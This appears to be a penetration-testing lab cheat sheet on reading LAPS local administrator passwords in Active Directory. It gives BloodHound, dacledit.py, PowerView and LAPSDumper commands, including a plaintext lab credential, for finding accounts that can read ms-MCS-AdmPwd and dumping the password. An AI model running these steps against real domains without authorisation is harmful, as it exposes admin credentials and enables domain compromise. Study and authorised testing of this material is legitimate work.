# 10.08 LAPS Read ReadLAPSPassword

> Read LAPS passwords from `ms-MCS-AdmPwd` via ReadProperty — `dacledit.py` skips group recursion, so use BloodHound to find indirect paths.

## Overview

LAPS stores the local administrator password in the ms-MCS-AdmPwd attribute on computer objects. If a controlled account (or a group it belongs to) has ReadProperty over that attribute, the password can be retrieved. Note that dacledit.py and PowerView do not perform recursive group membership checks — use BloodHound to find indirect paths via group membership.

## Steps

- Use BloodHound Cypher query MATCH p=((n)-[r:ReadLAPSPassword]->(m)) RETURN p to identify all principals with this right.
- dacledit.py -principal rita -target 'laps09$' returns nothing if the right is inherited through a group — query the group directly.
- dacledit.py -principal 'LAPS READERS' -target 'laps09$' shows ReadProperty on ms-MCS-AdmPwd.
- From Windows: PowerView Get-DomainObject or ActiveDirectory Get-ADComputer with the ms-mcs-AdmPwd property.
- Enumerate all LAPS-enabled computers with a PowerView loop script.
- From Linux: use LAPSDumper (laps.py) with the privileged account's credentials.

## Commands

### dacledit.py — check rita directly

```bash
python3 examples/dacledit.py -principal rita -target 'laps09$' -dc-ip <TARGET> <DOMAIN>.local/pedro:SecuringAD01
```

### dacledit.py — check group LAPS READERS

```bash
python3 examples/dacledit.py -principal 'LAPS READERS' -target 'laps09$' -dc-ip <TARGET> <DOMAIN>.local/pedro:SecuringAD01
```

### PowerView — check group DACL

```powershell
$group = Get-DomainGroup -Identity "LAPS Readers"
```

### PowerView — dump LAPS password

```powershell
Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
```

### AD Module — dump LAPS password

```powershell
Import-Module ActiveDirectory
```

### LAPSDumper from Linux

```bash
git clone https://github.com/n00py/LAPSDumper -q
```
